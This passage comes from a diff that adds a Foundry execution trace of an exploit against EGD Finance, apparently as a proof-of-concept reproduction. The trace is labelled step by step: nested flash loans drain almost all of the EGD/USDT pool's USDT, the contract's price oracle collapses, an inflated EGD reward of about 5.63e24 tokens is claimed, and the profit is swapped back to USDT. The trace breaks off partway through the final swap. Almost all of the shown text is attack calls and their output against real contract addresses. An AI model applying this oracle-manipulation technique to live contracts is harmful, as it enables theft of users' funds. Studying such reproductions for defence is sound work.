+    │   │   │   │   @ 0xde38df4499a6353ea263267f5d1a6cb23648309c409e74b142ea0f8d9a85e9f2: 0x0000000000000000000000000000000000000000000000410d586a20a4c00000 → 0x000000000000000000000000000000000000000000000046791fc84e07d00000
+    │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c4: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c8: 0 → 0x000000000000000000000000000000000000000000000000000005c20e1c1ff6
+    │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c5: 0 → 0x0000000000000000000000000000000000000000000000000000000062f0476c
+    │   │   │   │   @ 0x0984a69ac10677aab39e04b44cf0942cce817736193660a54d33ea47d690f5db: 0 → 0x0000000000000000000000000000000000000000000000056bc75e2d63100000
+    │   │   │   │   @ 0xb7989e21bffbcdff99d4815bc6ded578bf89e3c46a4eb7d723a4fbf6d89655f4: 0x000000000000000000000000000000000000000000000000b469471f80140000 → 0x000000000000000000000000000000000000000000000000de0b6b3a76400000
+    │   │   │   │   @ 0x0dce5906fbc13fd442f854f2244b50e3b6b064877a3905237a35ff470187cffc: 0x00000000000000000000000000000000000000000000000882d00c2da8540000 → 0x0000000000000000000000000000000000000000000000089e917994f71c0000
+    │   │   │   │   @ 0x6f4a07941980c158e10a0d88c8bdc6aa7f0200169e80c40f66893a1ad07d81ce: 0x00000000000000000000000000000000000000000000000176b344f2a78c0000 → 0x000000000000000000000000000000000000000000000001a055690d9db80000
+    │   │   │   │   @ 0xe98c9f1a3cba3d7af8caed4e0f935e9456815248ef796e878485b88a41fe0942: 0x000000000000000000000000000000000000000000000000f9ccd8a1c5080000 → 0x0000000000000000000000000000000000000000000000014d1120d7b1600000
+    │   │   │   │   @ 112: 177 → 178
+    │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c6: 0 → 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000
+    │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c7: 0 → 0x0000000000000000000000000000000000000000000000000000000062f0476c
+    │   │   │   └─ ← [Stop]
+    │   │   └─ ← [Return]
+    │   ├─  storage changes:
+    │   │   @ 0x0cc037b3dd2910b315b294c224bfa94d0e0a5cae1031b7388b45b00595c58a97: 0 → 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a
+    │   │   @ 0x0cc037b3dd2910b315b294c224bfa94d0e0a5cae1031b7388b45b00595c58a9a: 0 → 1
+    │   └─ ← [Stop]
+    ├─ [0] VM::warp(1659914146 [1.659e9])
+    │   └─ ← [Return]
+    ├─ [0] console::log("-------------------------------- Start Exploit ----------------------------------") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [2531] USDT::balanceOf(Attacker: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "[Start] Attacker USDT Balance", val: 0, decimals: 18)
+    ├─ [6115] EGD_Finance::getEGDPrice() [staticcall]
+    │   ├─ [5287] 0x93c175439726797DcEe24D08e4ac9164E88e7Aee::getEGDPrice() [delegatecall]
+    │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   └─ ← [Return] 52434525786137830062160000 [5.243e25]
+    │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   └─ ← [Return] 424526224403899287665961 [4.245e23]
+    │   │   └─ ← [Return] 8096310933284567 [8.096e15]
+    │   └─ ← [Return] 8096310933284567 [8.096e15]
+    ├─ emit log_named_decimal_uint(key: "[INFO] EGD/USDT Price before price manipulation", val: 8096310933284567 [8.096e15], decimals: 18)
+    ├─ [5390] EGD_Finance::calculateAll(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   ├─ [4559] 0x93c175439726797DcEe24D08e4ac9164E88e7Aee::calculateAll(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
+    │   │   └─ ← [Return] 341874999999972 [3.418e14]
+    │   └─ ← [Return] 341874999999972 [3.418e14]
+    ├─ emit log_named_decimal_uint(key: "[INFO] Current earned reward (EGD token)", val: 341874999999972 [3.418e14], decimals: 18)
+    ├─ [0] console::log("Attacker manipulating price oracle of EGD Finance...") [staticcall]
+    │   └─ ← [Stop]
+    ├─ [440890] Exploit::harvest()
+    │   ├─ [0] console::log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve") [staticcall]
+    │   │   └─ ← [Stop]
+    │   ├─ [388047] USDT_WBNB_LPPool::swap(2000000000000000000000 [2e21], 0, Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x30303030)
+    │   │   ├─ [27971] USDT::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2000000000000000000000 [2e21])
+    │   │   │   ├─ emit Transfer(from: USDT_WBNB_LPPool: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 2000000000000000000000 [2e21])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0 → 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000
+    │   │   │   │   @ 0xba08221f8673e7bcd34c1b8c4689a983ae464d35addf83dda4fe5d5546a79b0d: 0x0000000000000000000000000000000000000000004656d8835cc384efa7cfd2 → 0x00000000000000000000000000000000000000000046566c17c967f93267cfd2
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [318656] Exploit::pancakeCall(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2000000000000000000000 [2e21], 0, 0x30303030)
+    │   │   │   ├─ [0] console::log("Flashloan[1] received") [staticcall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] console::log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve") [staticcall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   └─ ← [Return] 424526224403899287665961 [4.245e23]
+    │   │   │   ├─ [181971] EGD_USDT_LPPool::swap(0, 424526221219952604636716 [4.245e23], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x3030)
+    │   │   │   │   ├─ [3271] USDT::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 424526221219952604636716 [4.245e23])
+    │   │   │   │   │   ├─ emit Transfer(from: EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 424526221219952604636716 [4.245e23])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x00000000000000000000000000000000000000000000006c6b935b8bbd400000 → 0x000000000000000000000000000000000000000000005a5208647ec659f2662c
+    │   │   │   │   │   │   @ 0xe46ab351cfc7e645f5025e69527f16427d41b1d8f9405046d3951160b206b0db: 0x0000000000000000000000000000000000000000000059e59cdc7302f7b8fd29 → 0x000000000000000000000000000000000000000000000000000b4fc85b0696fd
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [152248] Exploit::pancakeCall(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0, 424526221219952604636716 [4.245e23], 0x3030)
+    │   │   │   │   │   ├─ [0] console::log("Flashloan[2] received") [staticcall]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [4115] EGD_Finance::getEGDPrice() [staticcall]
+    │   │   │   │   │   │   ├─ [3287] 0x93c175439726797DcEe24D08e4ac9164E88e7Aee::getEGDPrice() [delegatecall]
+    │   │   │   │   │   │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 52434525786137830062160000 [5.243e25]
+    │   │   │   │   │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3183946683029245 [3.183e15]
+    │   │   │   │   │   │   │   └─ ← [Return] 60722331 [6.072e7]
+    │   │   │   │   │   │   └─ ← [Return] 60722331 [6.072e7]
+    │   │   │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO] EGD/USDT Price after price manipulation", val: 60722331 [6.072e7], decimals: 18)
+    │   │   │   │   │   ├─ [0] console::log("Claim all EGD Token reward from EGD Finance contract") [staticcall]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   ├─ [132284] EGD_Finance::claimAllReward()
+    │   │   │   │   │   │   ├─ [131459] 0x93c175439726797DcEe24D08e4ac9164E88e7Aee::claimAllReward() [delegatecall]
+    │   │   │   │   │   │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 52434525786137830062160000 [5.243e25]
+    │   │   │   │   │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 3183946683029245 [3.183e15]
+    │   │   │   │   │   │   │   ├─ [77961] EGD::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 5630136300267721935773513 [5.63e24])
+    │   │   │   │   │   │   │   │   ├─ [6062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370]) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [4796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370]) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ [2062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   ├─ [796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6) [staticcall]
+    │   │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   │   │   │   ├─ emit Transfer(from: EGD_Finance: [0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], value: 5630136300267721935773513 [5.63e24])
+    │   │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   │   @ 0x605dad40018b1c400089e80bd7f208a7179aafeb9655950d98a4a7ab105c32ce: 0x00000000000000000000000000000000000000000000001ec904c4477975a1db → 0x00000000000000000000000000000000000000000000000043a28abe708080b2
+    │   │   │   │   │   │   │   │   │   @ 0xe713954835f74577f19560c03369dcf39153c4593895b4691271bc50406363c1: 0x0000000000000000000000000000000000000000000000002c6aa70056a3d747 → 0x00000000000000000000000000000000000000000000001eb1cce0895f98f870
+    │   │   │   │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0 → 0x00000000000000000000000000000000000000000000001e8562398908f52129
+    │   │   │   │   │   │   │   │   │   @ 0x5096d594c17fa3ff55677e295e2b3bf55957472d4bf73daad1f9d5c7f48341f4: 0x00000000000000000000000000000000000000000000446b5ce09b1f2983c040 → 0x00000000000000000000000000000000000000000000459c92b6da7983170bda
+    │   │   │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   │   │   ├─ emit Claim(account: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 5630136300267721935773513 [5.63e24])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c7: 0x0000000000000000000000000000000000000000000000000000000062f0476c → 0x0000000000000000000000000000000000000000000000000000000062f047a2
+    │   │   │   │   │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c6: 0x00000000000000000000000000000000000000000000000ad78ebc5ac6200000 → 0x00000000000000000000000000000000000000000000000ad78d856bcc31421c
+    │   │   │   │   │   │   │   │   @ 0x3071e6f2bdc15966be2799361b2ba6e8fd9bdccf2ea6d8cc910fd2cb13bd29c9: 0 → 0x000000000000000000000000000000000000000000000000000136eef9eebde4
+    │   │   │   │   │   │   │   │   @ 0x0984a69ac10677aab39e04b44cf0942cce817736193660a54d33ea47d690f5dc: 0 → 0x00000000000000000000000000000000000000000004a83a4ce778ede75f5f49
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   ├─ [844] EGD::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 5630136300267721935770000 [5.63e24]
+    │   │   │   │   │   ├─ emit log_named_decimal_uint(key: "[INFO] Get reward (EGD token)", val: 5630136300267721935770000 [5.63e24], decimals: 18)
+    │   │   │   │   │   ├─ [3271] USDT::transfer(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], 425803632116301509164208 [4.258e23])
+    │   │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], value: 425803632116301509164208 [4.258e23])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0xe46ab351cfc7e645f5025e69527f16427d41b1d8f9405046d3951160b206b0db: 0x000000000000000000000000000000000000000000000000000b4fc85b0696fd → 0x000000000000000000000000000000000000000000005a2adc7f9d3a598293ad
+    │   │   │   │   │   │   │   @ 0xe135b438163c07f06263f9c7a911682b41bdc632d00c89620a1db653a7041b6a: 0x000000000000000000000000000000000000000000005a5208647ec659f2662c → 0x0000000000000000000000000000000000000000000000272bf031545b76697c
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 52434525786137830062160000 [5.243e25]
+    │   │   │   │   ├─ [531] USDT::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 425803635300248192193453 [4.258e23]
+    │   │   │   │   ├─ emit Sync(reserve0: 52434525786137830062160000 [5.243e25], reserve1: 425803635300248192193453 [4.258e23])
+    │   │   │   │   ├─ emit Swap(sender: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount0In: 0, amount1In: 425803632116301509164208 [4.258e23], amount0Out: 0, amount1Out: 424526221219952604636716 [4.245e23], to: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 8: 0x62f0476c0000000059e59cdc7302f7b8fd290000002b5f7156a9d45760adf880 → 0x62f047a2000000005a2adc7f9d3a598293ad0000002b5f7156a9d45760adf880
+    │   │   │   │   │   @ 9: 0x0000000000000000000000000000cdc84d608a589dae17de808d816da4d876f2 → 0x0000000000000000000000000000cdc84d60fa4501c6a2a1abf56674bd6275b0
+    │   │   │   │   │   @ 10: 0x00000000000000000000000000002fd04ee60808fdf2e6ca8bb4b93fd569b56c → 0x00000000000000000000000000002fd068f3bc573e93a69e829253e3ca253a0c
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] console::log("Flashloan[2] payback success") [staticcall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [0] console::log("Swap the profit...") [staticcall]
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [24703] EGD::approve(pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─ emit Approval(owner: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0 → 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [844] EGD::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   └─ ← [Return] 5630136300267721935770000 [5.63e24]
+    │   │   │   ├─ [73543] pancakeRouter::swapExactTokensForTokensSupportingFeeOnTransferTokens(5630136300267721935770000 [5.63e24], 1, [0x202b233735bF743FA31abb8f71e641970161bF98, 0x55d398326f99059fF775485246999027B3197955], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1659914146 [1.659e9])
+    │   │   │   │   ├─ [44928] EGD::transferFrom(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], 5630136300267721935770000 [5.63e24])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6, value: 56301363002677219357700 [5.63e22])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x922D672F7e6E57c6481038e3cf63C529D88bc70d, value: 225205452010708877430800 [2.252e23])
+    │   │   │   │   │   ├─ [6062] 0x752F7676fB6bC59a128716253D795d516723EF4E::checkInvitor(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   ├─ [4796] 0x95b16218f69baA646c316226757e273388D6BCe0::userInfo(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000003cb0fe8b5ac9d36f22465424412d3e76988747e6
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: 0x3Cb0FE8b5ac9D36F22465424412D3e76988747E6, value: 281506815013386096788500 [2.815e23])
+    │   │   │   │   │   ├─ emit Transfer(from: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], to: EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d], value: 5067122670240949742193000 [5.067e24])
+    │   │   │   │   │   ├─ emit Approval(owner: Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], spender: pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640558972334913766963387446935 [1.157e77])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 10: 0x00000000000000000000000000000000000000000003ace7b7c3fdb3b997bb64 → 0x00000000000000000000000000000000000000000003dc98213de3d1b89b8b74
+    │   │   │   │   │   │   @ 0xe5542c87c263a37173ff5526953eb9533e10456dc0cab088056d7d806a46c4f5: 0x00000000000000000000000000000000000000000000000982889be99e7708fb → 0x00000000000000000000000000000000000000000000000abb11a874386c5c3a
+    │   │   │   │   │   │   @ 0x96867eab774e1089293c5b7208631b0944de6ce2f7fc6461e87d145c0d111048: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff → 0xfffffffffffffffffffffffffffffffffffffffffffbcefebac9465d162a3697
+    │   │   │   │   │   │   @ 0xc37a8afa0267775364d579f946ac39132758a218ad1236fe55c39881c6ec100c: 0x00000000000000000000000000000000000000000000011c3f85b33f30858c08 → 0x000000000000000000000000000000000000000000000137b7914d6db8955d13
+    │   │   │   │   │   │   @ 0x996b860ef646da948c7d745162e3851398cba818db7bc8c7a4d9d465a54dfa11: 0x00000000000000000000000000000000000000000000001e8562398908f52129 → 2
+    │   │   │   │   │   │   @ 0xb505b1e394fb4b2b3a018708ca0a896185b0b5c590b24bbe5bb823eb5e9f9de9: 0x0000000000000000000000000000000000000000000000046b5b65ffb5bc25fd → 0x0000000000000000000000000000000000000000000000064028f8cf9cac22da
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [531] USDT::balanceOf(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 722589103651095472508 [7.225e20]
+    │   │   │   │   ├─ [893] EGD_USDT_LPPool::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 52434525786137830062160000 [5.243e25], 425803635300248192193453 [4.258e23], 1659914146 [1.659e9]
+    │   │   │   │   ├─ [844] EGD::balanceOf(EGD_USDT_LPPool: [0xa361433E409Adac1f87CDF133127585F8a93c67d]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 57501648456378779804350000 [5.75e25]
+    │   │   │   │   ├─ [18674] EGD_USDT_LPPool::swap(0, 37436831042128714469967 [3.743e22], Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
+    │   │   │   │   │   ├─ [3271] USDT::transfer(Exploit: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 37436831042128714469967 [3.743e22])
